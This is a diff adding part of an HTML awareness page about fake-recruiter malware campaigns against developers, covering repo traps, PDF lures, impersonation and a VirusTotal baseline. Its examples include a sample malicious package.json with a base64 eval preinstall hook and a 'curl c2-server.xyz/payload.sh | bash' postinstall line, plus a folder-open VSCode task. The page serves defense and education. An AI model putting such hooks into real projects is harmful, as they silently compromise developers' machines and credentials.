+        <button onclick="openModal('modal-virustotal')" class="text-cyan-400 hover:text-cyan-300 underline ml-1">View full threat graph →</button></p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════
+     DEFENSE PLAYBOOK
+═══════════════════════════════════════════ -->
+<section id="defense" class="max-w-6xl mx-auto px-4 pb-20">
+  <div class="text-center mb-10">
+    <h2 class="text-3xl font-black text-white mb-3">🛡️ Your Defense Playbook</h2>
+    <p class="text-slate-400 text-sm">Practical steps to neutralize each attack vector</p>
+  </div>
+  <div class="grid sm:grid-cols-2 lg:grid-cols-4 gap-4">
+
+    <div class="bg-slate-900 border border-slate-700/50 rounded-xl p-5">
+      <div class="text-3xl mb-3">🍎</div>
+      <h3 class="font-bold text-white mb-2 text-sm">PDF: Use Apple Preview</h3>
+      <p class="text-slate-400 text-xs leading-relaxed">Preview has <strong class="text-emerald-400">zero JavaScript support</strong>. /OpenAction and /JS scripts simply don't run. Never open unsolicited PDFs in Adobe Acrobat.</p>
+    </div>
+
+    <div class="bg-slate-900 border border-slate-700/50 rounded-xl p-5">
+      <div class="text-3xl mb-3">🐳</div>
+      <h3 class="font-bold text-white mb-2 text-sm">Code: Docker / Codespaces</h3>
+      <p class="text-slate-400 text-xs leading-relaxed">Run ALL technical tests with no host volume mounts and no env vars passed in. <strong class="text-emerald-400">GitHub Codespaces</strong> = instant browser-based sandbox with zero access to your local machine.</p>
+    </div>
+
+    <div class="bg-slate-900 border border-slate-700/50 rounded-xl p-5">
+      <div class="text-3xl mb-3">🔎</div>
+      <h3 class="font-bold text-white mb-2 text-sm">VSCode: Check .vscode/</h3>
+      <p class="text-slate-400 text-xs leading-relaxed">Before opening a cloned repo in VSCode, check for <code class="text-red-400">.vscode/tasks.json</code>. A <code class="text-red-400">runOn: folderOpen</code> task executes <strong class="text-red-400">before you run any code</strong>.</p>
+    </div>
+
+    <div class="bg-slate-900 border border-slate-700/50 rounded-xl p-5">
+      <div class="text-3xl mb-3">📹</div>
+      <h3 class="font-bold text-white mb-2 text-sm">Always Request Video</h3>
+      <p class="text-slate-400 text-xs leading-relaxed">Before any technical work, request a 15-min video call. <strong class="text-emerald-400">Real recruiters welcome it.</strong> Bots and scam ops ghost immediately or cite camera problems.</p>
+    </div>
+
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════
+     FOOTER
+═══════════════════════════════════════════ -->
+<footer class="border-t border-slate-800 bg-slate-900/50">
+  <div class="max-w-6xl mx-auto px-4 py-10 text-center">
+    <p class="text-2xl mb-3">🛡️</p>
+    <p class="text-slate-300 font-semibold mb-3">Dev Recruitment Safeguards</p>
+    <p class="text-slate-500 text-xs max-w-2xl mx-auto mb-6 leading-relaxed">
+      <strong class="text-amber-300">⚠️ Educational Disclaimer:</strong>
+      All materials are provided for security-awareness and educational purposes only.
+      Names and personas are documented as-is from real incidents reported to the maintainer.
+      The sample PDF (APOM-DAPP) was independently vetted via VirusTotal (0/70 detections) before inclusion.
+      Screenshots are used under fair use for educational reporting.
+      Do not use this information for any purpose other than personal security education.
+    </p>
+    <div class="flex justify-center flex-wrap gap-4 text-xs text-slate-600">
+      <a href="https://github.com/drasticstatic/dev-recruitment-safeguards" target="_blank" rel="noopener" class="hover:text-slate-400 transition-colors">GitHub</a>
+      <span>·</span>
+      <a href="https://virustotal.com" target="_blank" rel="noopener" class="hover:text-slate-400 transition-colors">VirusTotal</a>
+      <span>·</span>
+      <span>© 2026 Christopher Wilson (drasticstatic)</span>
+    </div>
+  </div>
+</footer>
+
+<!-- ═══════════════════════════════════════════
+     MODALS
+═══════════════════════════════════════════ -->
+
+<!-- Modal: Repo Trap -->
+<div id="modal-repo-trap" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4">
+  <div class="absolute inset-0 bg-black/75 backdrop-blur-sm" onclick="closeModal('modal-repo-trap')"></div>
+  <div class="relative bg-slate-900 border border-red-900/50 rounded-2xl w-full max-w-2xl max-h-[90vh] overflow-y-auto shadow-2xl">
+    <div class="sticky top-0 bg-slate-900/95 backdrop-blur border-b border-slate-800 p-5 flex items-center justify-between z-10">
+      <h3 class="text-lg font-black text-white">🪤 Deep Dive: The Repo Trap</h3>
+      <button onclick="closeModal('modal-repo-trap')" class="text-slate-400 hover:text-white text-2xl leading-none w-8 h-8 flex items-center justify-center rounded-lg hover:bg-slate-800 transition-colors">&times;</button>
+    </div>
+    <div class="p-6 space-y-5">
+
+      <div class="bg-red-950/30 border border-red-800/40 rounded-xl p-4">
+        <h4 class="font-bold text-red-300 text-sm mb-3">⚙️ Attack Chain</h4>
+        <ol class="space-y-2 text-sm text-slate-300 list-decimal list-inside leading-relaxed">
+          <li>LinkedIn DM: <em>"I'm already confident in your contribution — can you review our UI workflow?"</em></li>
+          <li>Clone repo: <code class="text-cyan-400 bg-slate-800 px-1 rounded text-xs">git clone https://github.com/staufenbiel89/dtm.git</code></li>
+          <li>Run <code class="text-red-400 bg-slate-800 px-1 rounded text-xs">npm install</code> → <code class="text-red-400 text-xs">preinstall</code> hook fires immediately</li>
+          <li>BeaverTail infostealer executes, harvesting all credentials</li>
+          <li>InvisibleFerret RAT installed for persistent remote access</li>
+        </ol>
+      </div>
+
+      <div>
+        <h4 class="font-bold text-white text-sm mb-3">🔍 Malicious vs. Legitimate package.json</h4>
+        <div class="code-block p-4 text-xs overflow-x-auto leading-relaxed">
+          <pre class="text-slate-300"><span class="text-slate-500">// 🚩 MALICIOUS — what to look for:</span>
+<span class="text-amber-300">"scripts"</span>: {
+  <span class="text-red-400">"preinstall"</span>: <span class="text-red-300">"node -e 'eval(Buffer.from(\"BASE64==\",\"base64\").toString())'"</span>,
+  <span class="text-red-400">"postinstall"</span>: <span class="text-red-300">"curl https://c2-server.xyz/payload.sh | bash"</span>
+}
+
+<span class="text-slate-500">// ✅ LEGITIMATE — what safe scripts look like:</span>
+<span class="text-amber-300">"scripts"</span>: {
+  <span class="text-emerald-400">"build"</span>: <span class="text-emerald-300">"webpack --config webpack.config.js"</span>,
+  <span class="text-emerald-400">"test"</span>: <span class="text-emerald-300">"jest --coverage"</span>
+}</pre>
+        </div>
+      </div>
+
+      <div>
+        <h4 class="font-bold text-white text-sm mb-3">🕵️ The Hidden VSCode Auto-Run Trap</h4>
+        <p class="text-slate-400 text-sm mb-2">These repos include a hidden <code class="text-red-400 bg-slate-800 px-1 rounded text-xs">.vscode/tasks.json</code> that fires <strong class="text-red-400">before you run any code</strong>:</p>
+        <div class="code-block p-4 text-xs overflow-x-auto leading-relaxed">
+          <pre class="text-slate-300"><span class="text-slate-500">// .vscode/tasks.json</span>
+{
+  <span class="text-amber-300">"version"</span>: <span class="text-green-300">"2.0.0"</span>,
+  <span class="text-amber-300">"tasks"</span>: [{
+    <span class="text-amber-300">"label"</span>: <span class="text-green-300">"setup"</span>,
+    <span class="text-red-400">"type"</span>: <span class="text-red-300">"shell"</span>,
+    <span class="text-red-400">"command"</span>: <span class="text-red-300">"node errorHandler.js"</span>,
+    <span class="text-red-400">"runOptions"</span>: { <span class="text-red-400">"runOn"</span>: <span class="text-red-300">"folderOpen"</span> }
+  }]
+}</pre>
+        </div>
+      </div>
+
+      <div>
+        <h4 class="font-bold text-white text-sm mb-3">📸 Evidence</h4>
+        <div class="grid grid-cols-2 gap-3">
+          <div>
+            <img src="screenshots/Screenshot%202026-04-13%20at%2012.06.39.png" alt="Jacinta Stewart initial DM" class="rounded-xl border border-slate-700 w-full cursor-pointer hover:opacity-90 transition-opacity" onclick="window.open(this.src)" />
+            <p class="text-xs text-slate-500 mt-1 text-center">Initial DM from "Jacinta Stewart"</p>
+          </div>
+          <div>
+            <img src="screenshots/Screenshot%202026-04-17%20at%2013.59.42.png" alt="Profile deactivated after report" class="rounded-xl border border-slate-700 w-full cursor-pointer hover:opacity-90 transition-opacity" onclick="window.open(this.src)" />
+            <p class="text-xs text-slate-500 mt-1 text-center">Profile deactivated after reporting</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="bg-emerald-950/30 border border-emerald-800/40 rounded-xl p-4">
+        <h4 class="font-bold text-emerald-300 text-sm mb-2">✅ Safe Response Protocol</h4>
+        <ul class="space-y-1 text-sm text-slate-300 list-disc list-inside">
+          <li>Never clone without manually reading <code class="text-cyan-400 text-xs">package.json</code> first</li>
+          <li>Check for <code class="text-cyan-400 text-xs">.vscode/tasks.json</code> before opening in VSCode</li>
+          <li>Run in Docker: <code class="text-cyan-400 text-xs">docker run --rm -it node:lts sh</code></li>
+          <li>Use GitHub Codespaces for a fully isolated environment</li>
+          <li>Report the profile and repo to LinkedIn and GitHub</li>
+        </ul>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- Modal: The Lure -->
+<div id="modal-lure" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4">
+  <div class="absolute inset-0 bg-black/75 backdrop-blur-sm" onclick="closeModal('modal-lure')"></div>
+  <div class="relative bg-slate-900 border border-amber-900/50 rounded-2xl w-full max-w-2xl max-h-[90vh] overflow-y-auto shadow-2xl">
+    <div class="sticky top-0 bg-slate-900/95 backdrop-blur border-b border-slate-800 p-5 flex items-center justify-between z-10">
+      <h3 class="text-lg font-black text-white">🎣 Deep Dive: The Lure</h3>
+      <button onclick="closeModal('modal-lure')" class="text-slate-400 hover:text-white text-2xl leading-none w-8 h-8 flex items-center justify-center rounded-lg hover:bg-slate-800 transition-colors">&times;</button>
+    </div>
+    <div class="p-6 space-y-5">
+
+      <div class="bg-amber-950/30 border border-amber-800/40 rounded-xl p-4">
+        <h4 class="font-bold text-amber-300 text-sm mb-2">📄 Why Professional PDFs Are Dangerous</h4>
+        <p class="text-slate-400 text-sm">PDFs are not just documents — they're containers for code. Adobe Acrobat supports a full JavaScript engine with filesystem and network access. A PDF can silently execute code the moment it opens.</p>
+      </div>
+
+      <div>
+        <h4 class="font-bold text-white text-sm mb-3">⚡ PDF Attack Vectors</h4>
+        <div class="space-y-3">
+          <div class="flex gap-3 bg-slate-800/50 rounded-xl p-3">
+            <code class="text-red-400 text-sm flex-shrink-0 font-bold">/OpenAction</code>
+            <div>
+              <div class="text-sm font-semibold text-white">Executes on open</div>
+              <div class="text-xs text-slate-400 mt-0.5">JavaScript runs immediately when the file opens — before you've read a single word. Can download and run payloads, steal clipboard data, or fingerprint your system silently.</div>
+            </div>
+          </div>
+          <div class="flex gap-3 bg-slate-800/50 rounded-xl p-3">
+            <code class="text-red-400 text-sm flex-shrink-0 font-bold">/JS</code>
+            <div>
+              <div class="text-sm font-semibold text-white">Embedded JavaScript</div>
+              <div class="text-xs text-slate-400 mt-0.5">JavaScript embedded in a PDF stream. Can be triggered by UI interactions or automatically. In a 12-page text document, there is no legitimate reason for this flag.</div>
+            </div>
+          </div>
+          <div class="flex gap-3 bg-slate-800/50 rounded-xl p-3">
+            <span class="text-amber-400 text-sm flex-shrink-0 font-bold">Stage 2</span>
+            <div>
+              <div class="text-sm font-semibold text-white">The Follow-Up Coding Task</div>
+              <div class="text-xs text-slate-400 mt-0.5">After reading the impressive PDF you're given a "coding task" — which is Case Study #1 (the Repo Trap) delivered to an already-trusting target.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div>
+        <h4 class="font-bold text-white text-sm mb-3">🎯 Trust-Building Tactics in the APOM-DAPP PDF</h4>
+        <ul class="space-y-1.5 text-sm text-slate-300 list-disc list-inside leading-relaxed">
+          <li>12–18 month professional DeFi roadmap (EVM, smart contracts, AMM, perps)</li>
+          <li>Polished branding with real-sounding project name and tokenomics</li>
+          <li>Specific tech stack that signals they've "researched" you</li>
+          <li>Competitive salary figures ($150k–$200k) to lower defensive guard</li>
+          <li>Multiple "interview stages" that build incremental trust before the payload</li>
+        </ul>
+      </div>
+
+      <div>
+        <h4 class="font-bold text-white text-sm mb-3">🔍 How to Check a PDF on VirusTotal</h4>
+        <ol class="space-y-1.5 text-sm text-slate-400 list-decimal list-inside leading-relaxed">
+          <li>Upload the PDF at <strong class="text-white">virustotal.com</strong></li>
+          <li>Click the <strong class="text-amber-300">Behavior</strong> tab — not just the score</li>
+          <li>Check <strong class="text-white">Contacted Domains</strong> — any unknown servers?</li>
+          <li>Check <strong class="text-white">Dropped Files</strong> — any .exe, .dll, .bat, or .ps1?</li>
+          <li>Check <strong class="text-white">Shell Commands</strong> — any cmd.exe or powershell.exe?</li>
+          <li>Look for <strong class="text-red-400">/OpenAction</strong> or <strong class="text-red-400">/JS</strong> in static analysis flags</li>
+        </ol>
+      </div>
+
+      <div>
+        <h4 class="font-bold text-white text-sm mb-3">📸 Evidence</h4>
+        <div class="grid grid-cols-2 gap-3">
+          <div>
+            <img src="screenshots/Screenshot%202026-04-13%20at%2009.29.13.png" alt="Initial PDF outreach" class="rounded-xl border border-slate-700 w-full cursor-pointer hover:opacity-90 transition-opacity" onclick="window.open(this.src)" />
+            <p class="text-xs text-slate-500 mt-1 text-center">Initial outreach from "Josépha Russe"</p>
+          </div>
+          <div>
+            <img src="screenshots/Screenshot%202026-04-13%20at%2009.29.29.png" alt="PDF pitch details" class="rounded-xl border border-slate-700 w-full cursor-pointer hover:opacity-90 transition-opacity" onclick="window.open(this.src)" />
+            <p class="text-xs text-slate-500 mt-1 text-center">PDF pitch details</p>
+          </div>
+          <div>
+            <img src="screenshots/Screenshot%202026-04-18%20at%2012.30.53.png" alt="Fraudulent assignment confirmed" class="rounded-xl border border-slate-700 w-full cursor-pointer hover:opacity-90 transition-opacity" onclick="window.open(this.src)" />
+            <p class="text-xs text-slate-500 mt-1 text-center">Confirmed fraudulent assignment</p>
+          </div>
+          <div>
+            <img src="screenshots/Screenshot%202026-04-18%20at%2012.37.49.png" alt="Follow-up evidence" class="rounded-xl border border-slate-700 w-full cursor-pointer hover:opacity-90 transition-opacity" onclick="window.open(this.src)" />
+            <p class="text-xs text-slate-500 mt-1 text-center">Follow-up evidence</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="bg-emerald-950/30 border border-emerald-800/40 rounded-xl p-4">
+        <h4 class="font-bold text-emerald-300 text-sm mb-2">✅ Safe PDF Practices</h4>
+        <ul class="space-y-1 text-sm text-slate-300 list-disc list-inside">
+          <li><strong>Apple Preview</strong> — no JS engine, /OpenAction scripts do nothing</li>
+          <li><strong>Google Drive preview</strong> — browser-sandboxed, no local execution</li>
+          <li>If using Acrobat: <strong>disable JavaScript</strong> in Preferences → Trust Manager → JavaScript</li>
+          <li>Never open unsolicited attachments before a VirusTotal Behavior-tab check</li>
+        </ul>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- Modal: Impersonation -->
+<div id="modal-impersonation" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4">
+  <div class="absolute inset-0 bg-black/75 backdrop-blur-sm" onclick="closeModal('modal-impersonation')"></div>
+  <div class="relative bg-slate-900 border border-purple-900/50 rounded-2xl w-full max-w-2xl max-h-[90vh] overflow-y-auto shadow-2xl">
+    <div class="sticky top-0 bg-slate-900/95 backdrop-blur border-b border-slate-800 p-5 flex items-center justify-between z-10">
+      <h3 class="text-lg font-black text-white">🎭 Deep Dive: The Impersonation</h3>
+      <button onclick="closeModal('modal-impersonation')" class="text-slate-400 hover:text-white text-2xl leading-none w-8 h-8 flex items-center justify-center rounded-lg hover:bg-slate-800 transition-colors">&times;</button>
+    </div>
+    <div class="p-6 space-y-5">
+
+      <div>
+        <h4 class="font-bold text-white text-sm mb-3">🔄 The Scripted Message — Sent Twice, Two "People"</h4>
+        <div class="bg-slate-800 border border-slate-700 rounded-xl p-4 text-sm text-slate-300 italic leading-relaxed">
+          <p class="mb-2">"Hi Christopher,</p>
+          <p class="mb-2">Came across your work — really liked your fullstack experience, especially in Web3/DeFi.</p>
+          <p class="mb-2">We're building a DeFi startup focused on trading infrastructure (AMM, aggregation, perps, and AI-driven strategies)..."</p>
+          <div class="not-italic mt-3 pt-3 border-t border-slate-700 text-xs text-slate-500">
+            Sent nearly identically via <strong class="text-red-400">email from "Zam Villalon"</strong> AND <strong class="text-red-400">LinkedIn DM from "Sujon Pramanik"</strong> — same organization, different personas, same template.
+          </div>
+        </div>
+      </div>
+
+      <div>
+        <h4 class="font-bold text-white text-sm mb-3">🏢 Real Kuru Labs vs. Impersonator</h4>
+        <div class="overflow-x-auto rounded-xl border border-slate-700 overflow-hidden">
+          <table class="w-full text-xs text-left">
+            <thead class="bg-slate-800">
+              <tr>
+                <th class="py-2.5 px-3 text-slate-400">Signal</th>
+                <th class="py-2.5 px-3 text-emerald-400">✅ Real Kuru Labs</th>
+                <th class="py-2.5 px-3 text-red-400">🚩 Impersonator</th>
+              </tr>
+            </thead>
+            <tbody class="divide-y divide-slate-800 text-slate-300">
+              <tr>
+                <td class="py-2.5 px-3 text-slate-500">Presence</td>
+                <td class="py-2.5 px-3">Active on Monad, verified funding</td>
+                <td class="py-2.5 px-3">Genusix Labs shell co. (VA)</td>
+              </tr>
+              <tr>
+                <td class="py-2.5 px-3 text-slate-500">Outreach</td>
+                <td class="py-2.5 px-3">Official channels / verified founders</td>
+                <td class="py-2.5 px-3">3rd-degree DMs + cold email blast</td>
+              </tr>
+              <tr>
+                <td class="py-2.5 px-3 text-slate-500">First step</td>
+                <td class="py-2.5 px-3">Standard technical interview</td>
+                <td class="py-2.5 px-3">"Book HR first" via Calendly</td>
+              </tr>
+              <tr>
+                <td class="py-2.5 px-3 text-slate-500">Domain</td>
+                <td class="py-2.5 px-3">Official verified domain</td>
+                <td class="py-2.5 px-3 text-red-400">kurulabs.org + genusix.com</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div>
+        <h4 class="font-bold text-white text-sm mb-3">🕵️ How to Spot a Hijacked LinkedIn Profile</h4>
+        <div class="space-y-2">
+          <div class="flex items-start gap-2 text-sm"><span class="text-red-400 flex-shrink-0">🚩</span><div><strong class="text-white">The Vibe Shift:</strong> <span class="text-slate-400">Profile normally posts UI/UX but suddenly DMs you about a "DeFi gaming startup"</span></div></div>
+          <div class="flex items-start gap-2 text-sm"><span class="text-red-400 flex-shrink-0">🚩</span><div><strong class="text-white">The Scripted Opener:</strong> <span class="text-slate-400">Vague compliment + urgency: "Your background in [X] is exactly what our stealth startup needs"</span></div></div>
+          <div class="flex items-start gap-2 text-sm"><span class="text-red-400 flex-shrink-0">🚩</span><div><strong class="text-white">500+ Connections, Zero Activity:</strong> <span class="text-slate-400">Check Activity tab — no posts, likes, or comments for 2+ years, then suddenly job offers</span></div></div>
+          <div class="flex items-start gap-2 text-sm"><span class="text-red-400 flex-shrink-0">🚩</span><div><strong class="text-white">Always Online:</strong> <span class="text-slate-400">Profile perpetually shows as active; responses feel automated or templated</span></div></div>
+          <div class="flex items-start gap-2 text-sm"><span class="text-red-400 flex-shrink-0">🚩</span><div><strong class="text-white">Speed + Salary FOMO:</strong> <span class="text-slate-400">$180k–$220k for a "quick 30-min chat" is designed to lower your defensive guard immediately</span></div></div>
+        </div>
+      </div>
+
+      <div>
+        <h4 class="font-bold text-white text-sm mb-3">📸 Evidence</h4>
+        <div class="grid grid-cols-2 gap-3">
+          <div>
+            <img src="screenshots/Screenshot%202026-04-18%20at%2012.37.56.png" alt="Kuru Labs impersonation message" class="rounded-xl border border-slate-700 w-full cursor-pointer hover:opacity-90 transition-opacity" onclick="window.open(this.src)" />
+            <p class="text-xs text-slate-500 mt-1 text-center">Impersonation DM evidence</p>
+          </div>
+          <div>
+            <img src="screenshots/Screenshot%202026-04-18%20at%2012.38.45.png" alt="Genusix Labs shell company evidence" class="rounded-xl border border-slate-700 w-full cursor-pointer hover:opacity-90 transition-opacity" onclick="window.open(this.src)" />
+            <p class="text-xs text-slate-500 mt-1 text-center">Genusix Labs shell company</p>
+          </div>
+          <div>
+            <img src="screenshots/Screenshot%202026-04-18%20at%2012.38.11.png" alt="Additional evidence" class="rounded-xl border border-slate-700 w-full cursor-pointer hover:opacity-90 transition-opacity" onclick="window.open(this.src)" />
+            <p class="text-xs text-slate-500 mt-1 text-center">Additional evidence</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="bg-emerald-950/30 border border-emerald-800/40 rounded-xl p-4">
+        <h4 class="font-bold text-emerald-300 text-sm mb-2">✅ Verification Steps</h4>
+        <ul class="space-y-1 text-sm text-slate-300 list-disc list-inside">
+          <li>Post in Kuru Labs' official Discord: "Is Genusix Labs an authorized hiring partner?"</li>
+          <li>Search "Genusix Labs" independently — does it have organic web presence?</li>
+          <li>Confirm the Calendly link is on the company's official verified domain</li>
+          <li>If two people from the same org contact you simultaneously on different platforms — that's a coordinated campaign, not normal recruiting</li>
+        </ul>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- Modal: VirusTotal Threat Graph -->
+<div id="modal-virustotal" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4">
+  <div class="absolute inset-0 bg-black/75 backdrop-blur-sm" onclick="closeModal('modal-virustotal')"></div>
+  <div class="relative bg-slate-900 border border-cyan-900/50 rounded-2xl w-full max-w-3xl max-h-[90vh] overflow-y-auto shadow-2xl">
+    <div class="sticky top-0 bg-slate-900/95 backdrop-blur border-b border-slate-800 p-5 flex items-center justify-between z-10">
+      <h3 class="text-lg font-black text-white">📊 VirusTotal Threat Graph — APOM-DAPP PDF</h3>
+      <button onclick="closeModal('modal-virustotal')" class="text-slate-400 hover:text-white text-2xl leading-none w-8 h-8 flex items-center justify-center rounded-lg hover:bg-slate-800 transition-colors">&times;</button>
+    </div>
+    <div class="p-6 space-y-5">
+
+      <div class="bg-cyan-950/30 border border-cyan-800/40 rounded-xl p-4">
+        <div class="text-xs text-slate-500 font-mono mb-2 uppercase tracking-wider">File Hash (SHA-256):</div>
+        <code class="text-xs text-cyan-300 break-all leading-relaxed">a4c04694e8e703f30e64423d60148de58d7f6f9829f356f40acf9596b4442b57</code>
+        <div class="flex flex-wrap gap-2 mt-3">
+          <span class="bg-emerald-900/50 border border-emerald-700/50 text-emerald-300 text-xs px-2 py-1 rounded-full">0/70 Detections</span>
+          <span class="bg-slate-800 border border-slate-700 text-slate-400 text-xs px-2 py-1 rounded-full">Type: PDF</span>
+          <span class="bg-slate-800 border border-slate-700 text-slate-400 text-xs px-2 py-1 rounded-full">12 pages</span>
+          <span class="bg-emerald-900/50 border border-emerald-700/50 text-emerald-300 text-xs px-2 py-1 rounded-full">has_detections: false</span>
+        </div>
+      </div>
+
+      <!-- Threat graph visual -->
+      <div>
+        <h4 class="font-bold text-white text-sm mb-4">🕸️ Threat Graph (from VirusTotal export)</h4>
+        <div class="bg-slate-800/50 border border-slate-700 rounded-xl p-5">
+          <!-- Central node -->
+          <div class="flex justify-center mb-6">
+            <div class="bg-cyan-900/50 border-2 border-cyan-600/70 text-cyan-300 text-xs font-bold px-5 py-3 rounded-xl text-center shadow-lg">
+              📄 PDF File<br>
+              <span class="text-slate-500 font-mono text-xs font-normal">a4c04694…b4442b57</span>
+            </div>
+          </div>
+          <!-- Three branches -->
+          <div class="grid grid-cols-3 gap-3 text-xs">
+            <div class="space-y-2">
+              <div class="text-center text-slate-500 font-semibold uppercase tracking-wide mb-3">🌐 Domains (2)</div>
+              <div class="bg-emerald-950/40 border border-emerald-800/40 rounded-lg p-2.5 text-center">
+                <div class="text-emerald-400 font-mono text-xs break-all">acroipm2.adobe.com</div>
+                <div class="text-slate-500 mt-0.5">Adobe IPM</div>
+              </div>
+              <div class="bg-emerald-950/40 border border-emerald-800/40 rounded-lg p-2.5 text-center">
+                <div class="text-emerald-400 font-mono text-xs break-all">a1672.dscr.akamai.net</div>
+                <div class="text-slate-500 mt-0.5">Akamai CDN</div>
+              </div>
+            </div>
+            <div class="space-y-2">
+              <div class="text-center text-slate-500 font-semibold uppercase tracking-wide mb-3">📡 IPs (6)</div>
+              <div class="bg-emerald-950/40 border border-emerald-800/40 rounded-lg p-2 text-center"><div class="text-cyan-400 font-mono">8.8.8.8</div><div class="text-slate-500">Google DNS</div></div>
+              <div class="bg-emerald-950/40 border border-emerald-800/40 rounded-lg p-2 text-center"><div class="text-cyan-400 font-mono">52.5.13.197</div><div class="text-slate-500">AWS/Adobe</div></div>
+              <div class="bg-emerald-950/40 border border-emerald-800/40 rounded-lg p-2 text-center"><div class="text-cyan-400 font-mono">23.195.81.59</div><div class="text-slate-500">Akamai</div></div>
+              <div class="bg-emerald-950/40 border border-emerald-800/40 rounded-lg p-2 text-center"><div class="text-cyan-400 font-mono">184.29.30.201</div><div class="text-slate-500">Akamai</div></div>
+            </div>
+            <div class="space-y-2">
+              <div class="text-center text-slate-500 font-semibold uppercase tracking-wide mb-3">📁 Dropped (13)</div>
+              <div class="bg-emerald-950/40 border border-emerald-800/40 rounded-lg p-2.5 text-center">
+                <div class="text-emerald-400">1 × .zip</div>
+                <div class="text-slate-500">Clean</div>
+              </div>
+              <div class="bg-emerald-950/40 border border-emerald-800/40 rounded-lg p-2.5 text-center">
+                <div class="text-emerald-400">12 × cache files</div>
+                <div class="text-slate-500">PDF reader temp</div>
+              </div>
+              <div class="bg-red-950/40 border border-red-800/40 rounded-lg p-2.5 text-center">
+                <div class="text-red-400">0 × .exe / .dll</div>
+                <div class="text-slate-500">Malware would be here</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="bg-amber-950/30 border border-amber-800/40 rounded-xl p-4">
+        <h4 class="font-bold text-amber-300 text-sm mb-2">⚠️ What a Malicious Threat Graph Would Show</h4>
+        <ul class="space-y-1 text-sm text-slate-300 list-disc list-inside">
+          <li>Contacted domains: <code class="text-red-400 text-xs">pastebin.com</code>, <code class="text-red-400 text-xs">discord.com</code>, or random C2 IPs</li>
+          <li>Dropped files: <code class="text-red-400 text-xs">.exe</code>, <code class="text-red-400 text-xs">.dll</code>, <code class="text-red-400 text-xs">.bat</code>, or <code class="text-red-400 text-xs">.ps1</code> files written to temp directories</li>
+          <li>Shell commands: execution of <code class="text-red-400 text-xs">cmd.exe</code> or <code class="text-red-400 text-xs">powershell.exe</code></li>
+          <li>PDF static flags: <code class="text-red-400 text-xs">/OpenAction</code> or <code class="text-red-400 text-xs">/JS</code> in the analysis</li>
+          <li>Registry writes: persistence mechanism for RAT installation</li>
+        </ul>
+      </div>
+
+      <div class="bg-slate-800/50 border border-slate-700/50 rounded-xl p-4 text-center">
+        <p class="text-xs text-slate-500 italic leading-relaxed">Verdict: This specific file is safe for educational use. The behavior shown is standard Adobe Acrobat activity when opening a PDF. Use this report as your baseline for "normal" — anything significantly different warrants immediate investigation before proceeding.</p>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════
+     JAVASCRIPT
+═══════════════════════════════════════════ -->
+<script>
+  const MODAL_IDS = ['modal-repo-trap','modal-lure','modal-impersonation','modal-virustotal'];
+
+  function openModal(id) {
+    document.getElementById(id).classList.remove('hidden');
+    document.body.classList.add('modal-open');
+  }
+
+  function closeModal(id) {
+    document.getElementById(id).classList.add('hidden');
+    if (!MODAL_IDS.some(m => !document.getElementById(m).classList.contains('hidden'))) {
+      document.body.classList.remove('modal-open');
+    }
+  }
+
+  document.addEventListener('keydown', e => {
+    if (e.key === 'Escape') MODAL_IDS.forEach(closeModal);
+  });
+
+  function copyChecklist() {
+    const text = [
+      '🛡️ DEV RECRUITMENT SAFEGUARDS — Security Checklist',
+      '='.repeat(50),
+      'Run this BEFORE responding to ANY unsolicited recruiter message.',
+      '',
+      '🔍 SCAN FIRST',
+      'Upload any file/URL to VirusTotal.com. Check the BEHAVIOR tab for /OpenAction',
+      'or /JS flags. A 0/70 score means UNKNOWN, not safe.',
+      '',
+      '🕵️ VERIFY IDENTITY',
+      'Check the LinkedIn "Activity" tab. Dormant accounts with sudden DMs = red flag.',
+      'Cross-reference on Twitter/X or Discord.',
+      '',
+      '📦 SANDBOX FIRST — ALWAYS',
+      'Use Apple Preview (not Adobe) for PDFs. Run code tests in Docker or a disposable',
+      'VM with NO access to your host .env files, SSH keys, or AWS credentials.',
+      '',
+      '📞 DEMAND A VIDEO CALL',
+      'Before cloning anything, request a 15-min video. Most malicious actors will ghost.',
+      'Say: "I receive scam messages and need to verify you\'re real."',
+      '',
+      '📄 AUDIT package.json',
+      'Before npm install, open package.json manually. Look for base64 strings or',
+      'external URL calls in preinstall/postinstall hooks.',
+      '',
+      '🔗 VERIFY THE DOMAIN',
+      'Check the recruiter\'s email domain carefully. Lookalike domains are common.',
+      'Verify against the company\'s official social media.',
+      '',
+      '🔁 CROSS-REFERENCE THE COMPANY',
+      'Search the company on Google AND LinkedIn separately. If it only exists in the',
+      'PDF they sent you — it\'s a scam.',
+      '',
+      '🛡️ CONFIRM VIA OFFICIAL CHANNELS',
+      'Post in the company\'s Discord or Twitter/X to confirm the recruiter is a verified',
+      'partner. Legitimate companies welcome this verification.',
+      '',
+      '-'.repeat(50),
+      'Source: https://github.com/drasticstatic/dev-recruitment-safeguards',
+    ].join('\n');
+
+    const btn = document.getElementById('copyBtn');
+
+    const succeed = () => {
+      btn.textContent = '✅ Copied!';
+      btn.classList.replace('bg-amber-600','bg-emerald-600');
+      setTimeout(() => {
+        btn.textContent = '📋 Copy to Clipboard';
+        btn.classList.replace('bg-emerald-600','bg-amber-600');
+      }, 2500);
+    };
+
+    if (navigator.clipboard) {
+      navigator.clipboard.writeText(text).then(succeed).catch(() => fallbackCopy(text, succeed));
+    } else {
+      fallbackCopy(text, succeed);
+    }
+  }
+
+  function fallbackCopy(text, cb) {
+    const ta = Object.assign(document.createElement('textarea'), {
+      value: text, style: 'position:fixed;opacity:0'
+    });
+    document.body.appendChild(ta);
+    ta.select();
+    try { document.execCommand('copy'); cb(); } catch(e) {}
+    document.body.removeChild(ta);
+  }
+</script>
+
+</body>
+</html>
